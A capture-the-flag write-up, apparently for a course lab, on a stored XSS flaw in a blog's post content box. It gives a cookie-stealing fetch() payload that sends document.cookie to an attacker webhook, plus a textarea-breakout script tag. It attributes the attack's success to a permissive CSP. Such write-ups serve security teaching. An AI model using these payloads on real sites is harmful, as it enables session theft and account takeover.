# Challenge `Read my lips: No more scripts! ` writeup

- Vulnerability: What type of vulnerability is being exploited
  - XSS
- Where: Where is the vulnerability present
  - `http://ssof2526.challenges.cwte.me:25254` in the new blogpost content box.
- Impact: What results of exploiting this vulnerability
  - Allows any user to inject malicious code into the website

## Steps to reproduce

1. Get a URL in Webhook to collect the requests
2. Host a script online with the following content: `fetch("webhook?cookie="+document.cookie)` (where webhook is you URL).
3. Write a random title (must be random since it checks for previous posts with the same title) and random content in the `Content` box, and click `Create Post`. This will redirect you to a new page to update your post.
4. Write this script: `</textarea><script src=" script_link "></script>` (where script_link is the link to your online script), into the `Content box` and click `Update post and send it for admin review`.
5. Admin will load the script and execute it which will send a request to your webhook with their cookies (and the flag).

Note:
- In step 4, make sure to include the `</textarea>` closing tag, since without it, the script will be treated as plain text instead of executable code.
- This approach works because the Content Security Policy’s `script-src *` directive allows scripts to be loaded from any origin.

[(POC)](read_my_lips_no_more_scripts_poc.py)